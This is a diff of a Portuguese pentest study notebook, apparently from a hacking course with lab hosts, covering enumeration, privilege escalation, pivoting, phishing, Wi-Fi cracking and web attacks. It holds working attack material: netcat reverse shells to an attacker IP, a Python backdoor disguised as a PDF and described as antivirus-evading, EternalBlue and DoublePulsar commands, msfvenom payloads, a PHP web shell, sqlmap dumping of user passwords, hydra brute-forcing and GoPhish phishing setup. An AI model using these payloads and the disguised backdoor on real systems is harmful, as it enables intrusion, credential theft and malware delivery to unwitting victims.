@@ -4681,21 +4681,25 @@ Nota: Quando sem permissão de alterar o path do serviço nem reiniciar, pode-se
 
 - Enumeração Host: Linux
 
-    id
+.
 
-    cat /etc/passwd
+	id
 
-    hostname
+	cat /etc/passwd
 
-    uname -a
+	hostname
 
-    cat /etc/issue 
+	uname -a
+
+.
+
+	cat /etc/issue 
 
 Versão exata do ubuntu/SO
 
     cat /etc/*-release 
 
-        Informações de versões do sistema (search for exploits)
+Informações de versões do sistema (search for exploits)
 
     dpkg -l | grep "wget"
 
@@ -4704,41 +4708,44 @@ Versão exata do ubuntu/SO
     route
 
     netstat -nlpu | nlpt 
+   
+. 
 
     ps aux 
 
-        Programas que estão em execução
+Programas que estão em execução
 
     cat etc/crontab 
 
-        Pega a tabela de agendamento de tarefas
+Pega a tabela de agendamento de tarefas
 
     find / -writable -type d2>/dev/null 
 
-        Pega os arquivos que tem permissão de escrita pelo user atual
+Pega os arquivos que tem permissão de escrita pelo user atual
 
     find / -perm -u=s -type f 
 
-        Pega os arquivos do usuário com priv alto
-
+Pega os arquivos do usuário com priv alto
 
     sudo -l 
 
-        Lista prog que estão sendo executados pelo sudo
+Lista prog que estão sendo executados pelo sudo
 
 
-Enumeração automatizada: Linux
+- Enumeração automatizada: Linux
+
+.
 
     LinPeas 
 
-        Ferramenta de enumeração para linux, do criador do WinPeas GitHub/carlospolop/linpeas
+Ferramenta de enumeração para linux, do criador do WinPeas GitHub/carlospolop/linpeas
 
     Linux-Exploit-Suggester 
 
-        Outra ferramenta de enumeração linux - github/mzet-/linux...
+Outra ferramenta de enumeração linux - github/mzet-/linux...
 
 
-Linux PrivEsc: Sudo
+- Linux PrivEsc: Sudo
 
 Quando dado o comando sudo -l ele te mostra quais programas são iniciados com o sudo... se caso tiver mostrando o VIM ou ALL
 
@@ -4749,28 +4756,30 @@ Quando dado o comando sudo -l ele te mostra quais programas são iniciados com o
     sudo vim -c '!bash' 
 
 
-Linux PrivEsc: Permissões e Cron
+- Linux PrivEsc: Permissões e Cron
 
 Ao enumerar o host identificar possíveis diretórios com permissão de escrita.
 
     ls -la /etc/cron* 
 
-        Lista as cron que roda no servidor
+Lista as cron que roda no servidor
 
     cat /etc/crontab
 
     find / -type f -perm 777 2>/dev/null
+    
+.
 
     ls -la /etc/cron.outly/
 
-        Se o arquivo tem permissão 777 editar e colocar o código..
+Se o arquivo tem permissão 777 editar e colocar o código..
 
     nc -e /bin/bash Ip-do-Atacante Porta
 
 
 Desafio: Invadir os hosts 172.30.0.15,20,30,40 e pegar o acesso ao host coreserver
 
-Linux PrivEsc: Kernel
+- Linux PrivEsc: Kernel
 
 Procurar por vulnerabilidades, podendo usar a ferramenta do Linux-Exploit-Suggester. Ao encontrar as CVEs pesquisar por exploits públicos, no exemplo DirtyCows cowroot.c
 
@@ -4778,110 +4787,107 @@ Com o exploit, deve-se atentar para o payload, identificando se o sistema é 32 
 
     gcc priv.c -o -pthread -m32 Usar o -m32 
 
-        Para compilar para sistema 32bits, se 64 não passa nada. Usar –static caso tenha erro
+Para compilar para sistema 32bits, se 64 não passa nada. Usar –static caso tenha erro
 
-    Com o arquivo em mãos 
+Com o arquivo em mãos 
 
         ./arquivo 
 
-        E passará a ter acesso root ao sistema. 37.59.174.231/blog
-
+E passará a ter acesso root ao sistema. 37.59.174.231/blog
 
     wget https://link.aqui.com -no-check-certificate 
 
-        Wget com flag para não checar o certificado https
+Wget com flag para não checar o certificado https
 
 
-
-Pivoting: Da internet para a rede interna
+- Pivoting: Da internet para a rede interna
 
 Ao ganhar acesso a uma máquina na internet, verificar a possibilidade de navegar na rede interna daquele host, que é chamado de Pivoting. Usando uma shell para conectar com o Meterpreter
 
     meterpreter> ifconfig 
 
-        Verificar as interfaces
+Verificar as interfaces
 
     meterpreter> route 
 
-        Verifica a tabela de roteamento
+Verifica a tabela de roteamento
 
     meterpreter> run autoroute -s 10.10.20.0/24 
 
-        Faz uma rota para a rede interna podendo ser varrida pelo meterpreter
+Faz uma rota para a rede interna podendo ser varrida pelo meterpreter
 
     meterpreter> background 
 
-        Deixar a sessão em segundo plano
+Deixar a sessão em segundo plano
 
     meterpreter> use auxiliary/server/socks4a 
 
-        Módulo para comunicar com a máquina local RUN
+Módulo para comunicar com a máquina local RUN
 
-    #sudo nano etc/proxychains.conf
+    sudo nano etc/proxychains.conf
 
-        Editrar: 127.0.0.1 1080 Porta do modulo aberto no metasploit
+Editrar: 127.0.0.1 1080 Porta do modulo aberto no metasploit
 
-    # proxychains nmap -v --open -sT -p 110,139 -Pn 10.10.20.0/24 
+    proxychains nmap -v --open -sT -p 110,139 -Pn 10.10.20.0/24 
 
-        Usar o proxychains para varrer a rede
+Usar o proxychains para varrer a rede
 
 Ao descobrir uma porta 10.10.20.4 porta 110 É possível fazer um tunelamento para a máquina atacante através do meterpreter na sessão do host principal
 
     meterpreter> sessions -i 1 
 
-        Volta para a máquina que está exposta na internet
+Volta para a máquina que está exposta na internet
 
     meterpreter> portfwd -l 110 -p 110 -r 10.10.20.4
 
-        Faz um portfwd com meterpreter
+Faz um portfwd com meterpreter
 
-    # nmap -v -sV -p 110 10.10.20.4
-
-
-
-    ENGENHARIA SOCIAL
+    nmap -v -sV -p 110 10.10.20.4
 
 
-    Livros:
+## ENGENHARIA SOCIAL
+
+
+Livros:
 
         Arte de Invadir
 
         Arte de enganar
 
-    Filmes:
+Filmes:
 
         Prenda-me se for capaz
-
         VIPs
 
+- Campanhas de Phishing
 
-Campanhas de Phishing
+Ferramenta `GoPhish github/gophish/releases`, coloca o ip no `.config` dá `chmod` e `./gophish` e acessa o link configura alvo, template origem e o email caso seja Gmail `smtp.gmail.com:587` a conta deve ter `less security` app access deve estar on e o 2FA desabilitado Login e senha é o email e senha do email de envio
 
-Ferramenta GoPhish github/gophish/releases, coloca o ip no .config dá chmod e ./gophish e acessa o link configura alvo, template origem e o email caso seja Gmail smtp.gmail.com:587 a conta deve ter less security app access deve estar on e o 2FA desabilitado Login e senha é o email e senha do email de envio
+- Código indetectável pelos antivírus disfarçado de PDF
 
-Código indetectável pelos antivírus disfarçado de PDF
+.
 
-import socket,os
+	import socket,os
 
-os.popen(explorer http://site.com/pdf)
+	os.popen(explorer http://site.com/pdf)
 
-ip = "192.168.25.2"
+	ip = "192.168.25.2"
 
-porta = 80
+	porta = 80
 
-s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-s.connect((ip,porta))
+	s.connect((ip,porta))
 
-while True:
+	while True:
 
-    cmd = s.recv(1024)
+	    cmd = s.recv(1024)
 
-    for comando in os.popen(cmd):
+	    for comando in os.popen(cmd):
 
-          s.send(comando)
+		  s.send(comando)
 
-    Podendo ser feito um exe usando o python
+Podendo ser feito um exe usando o python
 
         pyinstaller.exe ..\cod.py --onefile --windowed --icon=pdf.ico
 
@@ -4890,124 +4896,121 @@ Nota: 	Criar um arquivo sfx com o winrar e abrir o código por trás dando acess
 
 Cherrrytree Editor de texto bem organizado e bom para anotações de relatórios
 
-    WIFI HACKING BONUS INTRODUÇÃO
+## WIFI HACKING BONUS INTRODUÇÃO
 
 
 Colocar a placa de rede wireless em modo monitor para escutar os dados que estão trafegando próximo da placa de rede.
 
     iwconfig 
 
-        Informações da placa de wireless
+Informações da placa de wireless
 
     airmon-ng 
 
-        Ferramenta de monitoramento de rede wireless
+Ferramenta de monitoramento de rede wireless
 
     airmon-ng check 
 
-        Checa os processos abertos
+Checa os processos abertos
 
     airmon-ng check kill 
 
-        Mata os processos abertos
+Mata os processos abertos
 
     iwconfig wlan1 mode monitor 
 
-        Habilitar apenas a placa wireless sem matar os as outras redes 
+Habilitar apenas a placa wireless sem matar os as outras redes 
 
     airmon-ng start wlan-interface 
 
-        Habilitar o adaptador wireless para entrar em modo monitor
+Habilitar o adaptador wireless para entrar em modo monitor
 
     tcpdump -vv -i wlan0mon 
 
-        Capturar os sinais que estão próximos 
+Capturar os sinais que estão próximos 
 
     airodump-ng wlan0mon 
 
-        Capturar dados dos sinais wifi próximos e trazer informações organizadas
+Capturar dados dos sinais wifi próximos e trazer informações organizadas
 
     airodump-ng wlan0mon -c1 
 
-        Capturar dados dos sinais wifi que estão no canal 1
+Capturar dados dos sinais wifi que estão no canal 1
 
     airodump-ng wlan0mon -c1 --bssid MAC ADDRESS 
 
-        Capturar dados dos sinal usando o MAC do rtr
+Capturar dados dos sinal usando o MAC do rtr
 
     airmon-ng stop wlan0mon 
 
-        Parar a captura dos sinais wifi
+Parar a captura dos sinais wifi
 
     service network-manager start 
 
-        Restaura a rede wireless para o modo managed
+Restaura a rede wireless para o modo managed
 
 
 Quando escutando no BSSID que é do roteador alvo e receber o MAC da estação e o modo de bloqueio for MAC e não a senha WPA2, pode-se trocar o MAC da placa de rede do atacante macchanger -m MA:CD:MA:C wlan-interf e subir a interface novamente para acessar a rede wifi.
 
-Atacando o protocolo WPA2
+- Atacando o protocolo WPA2
 
     airodump-ng wlan0mon -c1 --bssid MAC ADDRESS -w captura.wpa2.cap
 
-        Coloca em modo de captura salvando em arquivo.cap
+Coloca em modo de captura salvando em arquivo.cap
 
     aireplay-ng -0 10 -a MAC-ROUTER -c MAC-CLIENT  wlan-interf 
 
-        Manda 10 pacotes de  desautenticação. 
+Manda 10 pacotes de  desautenticação. 
 
 Quando aparecer o handshake no canto superior da tela, parar a captura e pagar o arquivo que foi salvo a captura.
 
     aircrack-ng captura.wpa.cap -w /caminho/wordlist 
 
-        Faz um bruteforce da senha wpa capturada.
+Faz um bruteforce da senha wpa capturada.
 
     airdecap-ng -p s3nh4d0w1f1 captura.cap -e ssid-em-texto 
 
-        Vai gerar um arquivo para ler no wireshark
+Vai gerar um arquivo para ler no wireshark
 
 
 THAT'S ALL FOLKS
 
-PENTEST EXPERIENCE
+### PENTEST EXPERIENCE
 
-    SILK
+- SILK
 
-
-    Host Silk: 
+Host Silk: 
 
         https://www.100security.com.br/ms17-010 #eternalblue #doublepulsar 
 
-	
-
 172.16.1.145
 
-    Alternativo Host Silk 145:  
+Alternativo Host Silk 145:  
 
         https://github.com/sailay1996/eternal-pulsar
 
 Fazer o clone do repositório e entrar na pasta depens.
 
-    msfvenom -p windows/shell_reverse_tcp LHOST=172.20.1.73 LPORT=8080 -f dll > shell.dll
+	msfvenom -p windows/shell_reverse_tcp LHOST=172.20.1.73 LPORT=8080 -f dll > shell.dll
 
-        Cria payload para shell reverso
+Cria payload para shell reverso
 
+	wine cmd
 
-    wine cmd
-
-    Em outro terminal: 
+Em outro terminal: 
 
         rlwrap nc -vnlp 8080
 
+No terminal do wine:
 
-    Eternalblue-2.2.0.exe --TargetIp 172.16.1.145 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig 1.txt
+	Eternalblue-2.2.0.exe --TargetIp 172.16.1.145 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig 1.txt
 
-    Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp 172.16.1.145 --TargetPort 445 --DllPayload shell.dll --DllOrdinal 1 --ProcessName svchost.exe --ProcessCommandLine --Protocol SMB --Architecture x86 --Function Rundll
+	Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp 172.16.1.145 --TargetPort 445 --DllPayload shell.dll --DllOrdinal 1 --ProcessName svchost.exe --ProcessCommandLine --Protocol SMB --Architecture x86 --Function Rundll
 
-        Os dois comando acima vai mandar a shell no terminal que tava com a porta aberta pelo nc
+Os dois comando acima vai mandar a shell no terminal que tava com a porta aberta pelo nc
 
 
-    Na shell do alvo: 
+Na shell do alvo: 
 
         net user suporte 12345
 
@@ -5017,11 +5020,11 @@ Fazer o clone do repositório e entrar na pasta depens.
 
         NetSh Advfirewall set allprofiles state off
 
+.
 
-    rdesktop 172.16.1.145 
+	rdesktop 172.16.1.145 
 
-        Acessa a máquina com login e senha criado acima
-
+Acessa a máquina com login e senha criado acima
 
 172.16.1.140
 
@@ -5029,7 +5032,7 @@ Elevar privilégios para acessar as pastas do... Após descobrir a Vulnerabilida
 
     https://github.com/jas502n/CVE-2019-1388
 
-    Seguir o tutorial
+Seguir o tutorial
 
         Abrir o arquivo.exe 
 
@@ -5046,11 +5049,8 @@ Elevar privilégios no host - Nmap Exploit
 https://w0lfram1te.com/privilege-escalation-with-nmap
 
     sudo -l 
-
     sudo nmap --interactive
-
     nmap> !sh
-
     cat /etc/passwd e shadow
 
 Captura as hashes e encontra a senha para o host 172.20.10.8 homologacao
@@ -5062,17 +5062,16 @@ Elevar privilégios no host - Kernel Exploit
 https://book.hacktricks.xyz/linux-hardening/privilege-escalation
 
     cat /proc/version 
-
     searchsploit "linux-version"
-
     https://github.com/xiaoxiaoleo/CVE-2009-2698
+    
+importar o arquivo no alvo (dar permissão) e executar
 
-        importar o arquivo no alvo (dar permissão) e executar
 
 
+- BYTEINC
 
-    BYTEINC
-
+Hosts:
 
 172.16.1.240
 
@@ -5083,24 +5082,23 @@ Ao descobrir uma vulnerabilidade no webmin de LFD com nmap, explorar com o explo
 Ao pegar o shadow e passwd, quebrar as senhas e acessar o server via ssh,ftp...
 
 
-    ALGOR
+- ALGOR
 
 172.16.1.116
 
-Ao descobrir as tecnologias e portas abertas, procurar por algo na url que permita mandar um arquivo pra dentro da máquina... O acs_path= É encontrado no código fonte como hidden
+Ao descobrir as tecnologias e portas abertas, procurar por algo na url que permita mandar um arquivo pra dentro da máquina... O `acs_path=` É encontrado no código fonte como hidden
 
-Fazer um exploit com msfvenom em php/reverse_php > config.php (esse config é o arquivo que a vítima pega por padrão) abrir server http com python e deixar escutando na porta do exploit com netcat e inserir na URL vitma/adm.php/ACS_path=IP-ATACANTE:porta-do-srv-http/ 
+Fazer um exploit com `msfvenom em php/reverse_php > config.php` (esse config é o arquivo que a vítima pega por padrão) abrir server http com python e deixar escutando na porta do exploit com netcat e inserir na URL `vitma/adm.php/ACS_path=IP-ATACANTE:porta-do-srv-http/`
 
 PrivEsc do host 116
 
-Varredura com o less.sh que mostra as possíveis vulnerabilidades e exploits
+Varredura com o `less.sh` que mostra as possíveis vulnerabilidades e exploits
 
-Após achar um exploit dirtcow rootcow.c ajustar para 32bits e executar
+Após achar um exploit `dirtcow rootcow.c` ajustar para 32bits e executar
 
     gcc -m32 cowroot.c -o cowroot -pthread -static 
 
-        Gera o executável (instalar pacote gcc-multilib se necessário)
-
+Gera o executável (instalar pacote gcc-multilib se necessário)
 
 172.16.1.195
 
@@ -5110,7 +5108,7 @@ Após enviar uma shell reversa com NC, fazer uma enumeração do host usando les
 
 comando com problema achado no linpeas -> /bin/bash -p
 
-    Site para procurar comando de escalar privilégios
+Site para procurar comando de escalar privilégios
 
         https://gtfobins.github.io/gtfobins/bash/
 
@@ -5118,34 +5116,32 @@ comando com problema achado no linpeas -> /bin/bash -p
 Site para montar shell reverso https://www.revshells.com/
 
 
-    ALUNMAQ
+- ALUNMAQ
 
-
-172.16.1.158
+Host: 172.16.1.158
 
 Bruteforce usado Hydra
 
-hydra -s 80 -L users.txt -P /usr/share/wordlists/rockyou.txt 172.16.1.158 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=180&User=^USER^&Password=^PASS^&submit:failed" -I
+	hydra -s 80 -L users.txt -P /usr/share/wordlists/rockyou.txt 172.16.1.158 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=180&User=^USER^&Password=^PASS^&submit:failed" -I
 
 Exploit 45010 encontrado pelo less.sh
 
     unoconv --format=docx Administrator.doc 
 
-        Converter documentos antigos do WORD Office
+Converter documentos antigos do WORD Office
 
-    Quebrar senha xls planilha scheets:
+Quebrar senha xls planilha scheets:
 
         https://www.password-find.com/crack_office_password_js.htm
 
 
-
-    GWCW
+- GWCW
 
 172.16.1.110
 
 Bruteforcer: crowbar brute force alternativo do hydra mas inferior
 
-    Exploit for rdp windows
+Exploit for rdp windows
 
         https://github.com/BlackMathIT/Esteemaudit-Metasploit 
 
@@ -5153,7 +5149,7 @@ kiwi e pega as creds necessárias
 
 172.16.1.120
 
-    Não é necessário Exploit vuln cuppa cms?
+Não é necessário Exploit vuln cuppa cms?
 
         https://www.exploit-db.com/exploits/25971
 
@@ -5165,9 +5161,7 @@ Exploração via Kernel usando o metasploit com banco de dados, abrindo sessão 
 Ajuda: https://mysnippets443.wordpress.com/2020/03/09/metasploit-establish-a-ssh-session-for-further-use/
 
 
-    PROSPEC           
-
-                             
+- PROSPEC           
 
 172.16.1.139
 
@@ -5188,65 +5182,60 @@ Login e senha encontrado no lab anterior
 Upload de payload .war e ganha a shell
 
 
-    ASLA
+- ASLA
 
 
 172.16.1.155 
 
-    Bruteforce no host com:
+Bruteforce no host com:
 
         Dirb no host com -X .pdf,.html,.txt,.htm
 
-    Metasploit 
+Metasploit 
 
         Com ipfire oinkcode
+Client for FTP portable 
 
-    Client for FTP portable 
+	https://www.ncftp.com/download/ 
 
-        https://www.ncftp.com/download/ 
+	curl -v –disable-epsv -u user:pass ftp://172.30.10.101:2221/Inetpub/ 
 
-    curl -v –disable-epsv -u user:pass ftp://172.30.10.101:2221/Inetpub/ 
-
-        Conectar FTP via curl
+Conectar FTP via curl
 
     curl -v -T "shell.asp" -u user:pass ftp://172.30.10.101:2221/Inetpub/ 
 
-        PUT via CURL
+PUT via CURL
 
     meterpreter> portfwd add -l 8088 -p 80 -r 172.30.10.101 
 
-        Redirecionamento de portas 8088 local da 80 remota OU
+Redirecionamento de portas `8088` local da 80 remota OU
+add regra no firewall: `any` de fora para `NAT 192.16.1.10` na  porta dest `2221`. 
+Irá no IP do firewall liberar a porta 443 apontando para o IP interno 192.16.1.10 na mesma porta
 
-        add regra no firewall: any de fora para NAT 192.16.1.10 na  porta dest 2221. 
-
-        Irá no IP do firewall liberar a porta 443 apontando para o IP interno 192.16.1.10 na mesma porta
-
-
-Faz upload de uma shell.asp no msfvenom para o ftp pasta da web e chama com um multi/handler escutando. E pega o meterpreter do host 172.30.10.101 que é o server interno do firewall que foi criado a regra.
+Faz upload de uma `shell.asp` no msfvenom para o ftp pasta da web e chama com um `multi/handler` escutando. E pega o meterpreter do host 172.30.10.101 que é o server interno do firewall que foi criado a regra.
 
 
-    DEVNIC
-
+- DEVNIC
 
 172.16.1.159
 
-    Joomla... https://www.exploit-db.com/exploits/47465 adaptado
+Joomla... https://www.exploit-db.com/exploits/47465 adaptado
 
         python2 joomla-expl.py -t http://172.16.1.10/ --exploit --lhost 192.10.1.10 --lport 445
 
-    Depois do comando com o nc 445 aberto pega a shell reversa
+Depois do comando com o nc 445 aberto pega a shell reversa
 
         getcap -r / 2>dev/null 
 
-        Analisa saída
+Analisa saída
 
     wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 
     https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c 
 
-        PRIVESC
+PRIVESC
 
-    PrivEsc com capabilities 
+PrivEsc com capabilities 
 
         https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
 
@@ -5255,18 +5244,18 @@ Faz upload de uma shell.asp no msfvenom para o ftp pasta da web e chama com um m
 
 Exploit da tecnologia usada no server drupa7-CVE-2018-7600.py (executa compilação no server alvo)
 
-    NC Portable
+NC Portable
 
         https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat
 
-    Escalar privilegios com 
+Escalar privilegios com 
 
         https://www.exploit-db.com/exploits/37292 (pega a shell root)
 
 
 Nota: Quando aparecer no gcc o erro undefined reference to 'openpty' usar a flag no gcc -lutil no fim 
 
-           Ao compilar opte por compilar no alvo e se nao funcionar compila na sua máquina
+Ao compilar opte por compilar no alvo e se nao funcionar compila na sua máquina
 
 Notas: DirtyCow - PrivEsc:
 
@@ -5277,44 +5266,41 @@ https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
 https://security.stackexchange.com/questions/145325/exploiting-dirty-cow-using-metasploit
 
 
-
-NOVA GERAÇÃO DE PENTEST PROFISSIONAL
+NOVA GERAÇÃO DE PENTEST PROFISSIONAL (DECSTORE)
 
     script nomedoarquivo
 
-        Salva/grava todo terminal até da EXIT
+Salva/grava todo terminal até da EXIT
 
     nmap --min-rate=60000
 
-        Envia/aumenta ao envio de pacotes para o host (detecção mais rápida)
+Envia/aumenta ao envio de pacotes para o host (detecção mais rápida)
 
     gobuster dir -u http://decstore.com.br -w /usr/share/dirb/wordlists/big.txt -t 100 -e --no-error -r -o gobuster -x php,bkp,old,txt,xml
 
-        Bruteforce nos diretórios do domínio com 100 threads url completa sem retorno de erro, seguir caminho de redirecionamento e gravar tudo no arquivo gobuster com tipos de arquivos, dessa forma procurando por entry points.
+Bruteforce nos diretórios do domínio com 100 threads url completa sem retorno de erro, seguir caminho de redirecionamento e gravar tudo no arquivo gobuster com tipos de arquivos, dessa forma procurando por entry points.
 
 
 Nota: Seclists baixar pasta de wordlists do github
 
     wc -l arquivo 
 
-        Retorna a quantidade de linhas no arquivo
+Retorna a quantidade de linhas no arquivo
 
     hydra -v -t10 -l decstore -P wordlist ftp://decstore.com.br -s 2121 
 
-        Faz um ataque de força bruta usando o hydra com 10 threads na porta 2121 (diferente da padrão)
-
+Faz um ataque de força bruta usando o hydra com 10 threads na porta 2121 (diferente da padrão)
 
 Nota: Processo de força bruta com o BurpSuite send to intruder->clear_all->add_field->payload->options
 
     nc -v -C site.com.br 
 
-        Mantém o terminal aberto.
+Mantém o terminal aberto.
 
- 
 
     echo "http://website.com" | /root/go/bin/html-tool atribs src href | grep -i ".js" /root/go/bin/getJS --url http://web.site.com/redirecionamento.php --complete
 
-        Ferramenta parsing website no github.com/tomnomnom e getJs para subir arquivos JS
+Ferramenta parsing website no github.com/tomnomnom e getJs para subir arquivos JS
 
 
 Nota: Em uma URL com final e.x: ...downloads.php um possível teste de vulnerabilidade é testar com downloads.php?file=downloads.php (esse produtos.php é o arquivo que você quer analisar) "no for use \? para não interpretar" e nisso descobrir se há vulnerabilidade, o nome file pode estar em uma wordlist para rodar até encontrar o parâmetro correto. Outro teste que pode ser feito é colocar file=/../../../../../../etc/passwd
@@ -5323,50 +5309,50 @@ Nota: Instalar pacote de wordlists apt install seclists e selecionar a lista par
 
     wfuzz -c -z file,burp-param.txt --hl 0 http://site.com/downloads.php?FUZZ=download.php 
 
-        Faz uma procura pelos parâmetros da lista na tentativa de encontrar um parâmetro vulnerável e explorá-lo e após encontrar o payload correto, tente colocar/navegar para encontrar outros arquivos e visualizando o código fonte.
+Faz uma procura pelos parâmetros da lista na tentativa de encontrar um parâmetro vulnerável e explorá-lo e após encontrar o payload correto, tente colocar/navegar para encontrar outros arquivos e visualizando o código fonte.
 
     http://site.com/produtos.php?id=10 and 2=2# 
 
-        Testes direto na URL de validação do banco de dados, se o banco retornar com a página mostrando aquele id é possível explorar o banco através de blind sql injection. 
+Testes direto na URL de validação do banco de dados, se o banco retornar com a página mostrando aquele id é possível explorar o banco através de blind sql injection. 
 
     http://site.com/produtos.php?id=10 and(select*from*(select(sleep(10)))asdasd)#
 
-        Outro modo de validação, se o banco demorar 10 segundos para responder é um indício de vulnerabilidade de blind sql injection. 
+Outro modo de validação, se o banco demorar 10 segundos para responder é um indício de vulnerabilidade de blind sql injection. 
 
     http://site.com/produtos.php?id=10 and database()=char(EmDecimalCom;)#
 
-        Validando o nome do banco de dados
+Validando o nome do banco de dados
 
 
-COMANDOS PARA EXPLORAR VULN DE SQL
+## COMANDOS PARA EXPLORAR VULN DE SQL
 
     sqlmap -v -u "http://site.com/produtos.php?id=10" --current-db --threads=10
 
-        Analisa a database atual procurando por vulnerabilidades
+Analisa a database atual procurando por vulnerabilidades
 
     sqlmap -v -u "http://site.com/produtos.php?id=10" --dbs --threads=10
 
-        Lista as databases dentro do server
+Lista as databases dentro do server
 
     sqlmap -v -u "http://site.com/produtos.php?id=10" --threads=10 -D db_name --tables
 
-        Lista as tabelas do banco selecionado
+Lista as tabelas do banco selecionado
 
     sqlmap -v -u "http://site.com/produtos.php?id=10" --threads=10 -D db_name -T table_name --columns
 
-        Lista as colunas da tabela selecionada
+Lista as colunas da tabela selecionada
 
     sqlmap -v -u "http://site.com/produtos.php?id=10" --threads=10 -D db_name -T table_name -C 'nome,email,senha' --dump
 
-        Lista os conteúdos das colunas selecionadas.
+Lista os conteúdos das colunas selecionadas.
 
     hash-identifier cola_hash_para_descobrir 
 
-        Identifica uma hash, o tipo da hash
+Identifica uma hash, o tipo da hash
 
     echo -n "word" | md5sum 
 
-        Printa em MD5 uma palavra informada
+Printa em MD5 uma palavra informada
 
 
 Nota: Ferramentas para quebrar hash: hashcat, jhon 
@@ -5375,42 +5361,40 @@ TENTATIVA DE EXECUÇÃO DE CÓDIGO REMOTO FILE UPLOAD
 
     nano arquivo.php
 
-        Crie um arquivo para fazer upload no site. (com o código abaixo)
+Crie um arquivo para fazer upload no site. (com o código abaixo)
 
-<?php
-
-			system($_GET['pentest']);	
-
-			?>
+	<?php
+	system($_GET['pentest']);	
+	?>
 
     put arquivo.php 
 
-        No FTP faça upload do arquivo criado
+No FTP faça upload do arquivo criado
 
     site.com/diretório/arquivo.php?pentest=ifconfig 
 
-        Acessar a url no diretório do arquivo e passando o parâmetro colocado no arquivo podendo executar comandos.
+Acessar a url no diretório do arquivo e passando o parâmetro colocado no arquivo podendo executar comandos.
 
     cp /usr/bin/nc 
 
-        Copie o binario do netcat
+Copie o binario do netcat
 
     put nc 
 
-        No FTP faça o upload do netcat
+No FTP faça o upload do netcat
 
 
 Nota: Copie usando a url, o arquivo do netcat para um outro local e dê permissão 777 nele cp /tmp/ncat e depois podendo abrir uma shell reversa usando o nc em tmp.
 
     nc -vnlp 80 
 
-        Abra uma conexão na sua máquina
+Abra uma conexão na sua máquina
 
     site.com/diretório/arquivo.php?pentest=/diretorio_netcat/nc 172.52.8.7 -e /bin/bash
 
-        Mande para a sua máquina o terminal do servidor via netcat
+Mande para a sua máquina o terminal do servidor via netcat
 
-    Comandos para dar spawn um bash mais interativo
+Comandos para dar spawn um bash mais interativo
 
         sudo python -c 'import pty; pty.spawn("/bin/sh")'
 
@@ -5421,31 +5405,29 @@ Nota: Copie usando a url, o arquivo do netcat para um outro local e dê permiss�
         python3 -c 'import pty;pty.spawn("/bin/bash")' 
 
 
-
-
-ESCAPANDO PRIVILEGIOS
+ESCALANDO PRIVILEGIOS
 
     find / -perm -u=s -type f 2>/dev/null 
 
-        Procura por arquivos  com SUID BIT ativo e procurar por um arquivo diferente para tentar escalar privilégios
+Procura por arquivos  com SUID BIT ativo e procurar por um arquivo diferente para tentar escalar privilégios
 
     echo "/bin/bash > cat 
 
-        Dentro de tmp cria uma arquivo cat com bin/bash escrito dentro (dê chmod 777)
+Dentro de tmp cria uma arquivo cat com bin/bash escrito dentro (dê chmod 777)
 
     env 
 
-        Lista o PATH e outras infos
+Lista o PATH e outras infos
 
     echo $PATH  
 
-        Lista o caminho total do PATH
+Lista o caminho total do PATH
 
     export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/tmp" 
 
-        Modifica o PATH para chamar o cat dentro de TMP
+Modifica o PATH para chamar o cat dentro de TMP
 
-            Agora só executar o arquivo ou se for uma cron, esperar ela rodar.
+Agora só executar o arquivo ou se for uma cron, esperar ela rodar.
 
 
 NOTA: Após comprometer um HOST e escalar privilégios, rode este comando para apresentar uma saída limpa e padrão OSCP: 
@@ -5453,45 +5435,43 @@ NOTA: Após comprometer um HOST e escalar privilégios, rode este comando para a
     cat /root/key.txt && hostname && id && whoami && ifconfig 
 
 
-NOTA: Amostra sobre uma alternativa para ProxyChains o Privoxy. https://www.youtube.com/watch?v=y9iSVx4XWhQ
+NOTA: 
+Amostra sobre uma alternativa para ProxyChains o Privoxy. https://www.youtube.com/watch?v=y9iSVx4XWhQ
+Alternativa para teste de LFD /..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd
+Comando para uma shell interativa: echo 0 > /proc/sys/vm/dirty_writeback_centisecs
 
-NOTA: Alternativa para teste de LFD /..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd
 
-NOTA: Comando para uma shell interativa: echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+INFORMATION GATHERING
 
-
-     INFORMATION GATHERING
-
-    Websites for search: 
+Websites for search: 
 
         https://consultas.plus/
         https://www.cnpj.world/
         https://urlscan.io/ 
 
-     
+Fuzzing de SUBDOMINIOS
 
-    Fuzzing de SUBDOMINIOS
         https://github.com/netsecurity-as/subfuz
 
+Transferir arquivos do alvo para o atacante:
 
-    Transferir arquivos do alvo para o atacante:
         netcat nc porta > file.etx | nc.exe -v ip porta < file.ext
         python httpserver
         Montar disco na maquina alvo para transferir arquivos 
         Colocar no site que tiver aberto e baixar
         Transferir via ssh scp file.ext user@ip:/home/user
 
+TIPO DE ARQUIVO PARA GOBUSTER DIRB BURPSUIT
 
-    TIPO DE ARQUIVO PARA GOBUSTER DIRB BURPSUIT
         php,bkp,old,txt,xml,cgi,pdf,html,htm,asp,aspx,pl,sql
         Flag user agent  -a Mozilla/5.0
 
-    Ferramenta animal par ENUMERAÇÃO WEB
+Ferramenta animal par ENUMERAÇÃO WEB
+
         wapiti --url http://rh.businesscorp.com.br/
 
- 
+Fazendo tunelamento com NGROK
 
-    Fazendo tunelamento com NGROK
         Acessa o site: https://ngrok.com/
         Cria a conta e pega o token
         Baixa o programa e joga na pasta bin
